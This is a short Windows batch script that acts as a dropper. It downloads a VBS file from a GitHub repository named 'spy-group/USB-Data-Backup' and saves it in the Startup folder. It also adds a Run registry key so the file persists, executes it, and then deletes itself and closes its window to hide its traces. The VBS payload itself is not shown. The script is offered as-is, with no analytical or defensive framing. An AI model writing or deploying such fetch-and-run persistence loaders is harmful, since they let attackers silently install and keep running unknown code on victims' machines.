@echo off
REM Download the VBS file from GitHub
curl -o "%TEMP%\test.vbs" https://raw.githubusercontent.com/spy-group/USB-Data-Backup/main/test.vbs

REM Copy the downloaded file to the Startup folder
copy "%TEMP%\test.vbs" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\test.vbs"

REM Add test.vbs to startup
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TestScript" /t REG_SZ /d "wscript \"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\test.vbs\"" /f

REM Run the VBS file
wscript "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\test.vbs"

REM Step 6: Delete the BAT file after execution
echo Deleting BAT file...
del "%~f0"

REM Step 7: Close CMD window automatically
exit
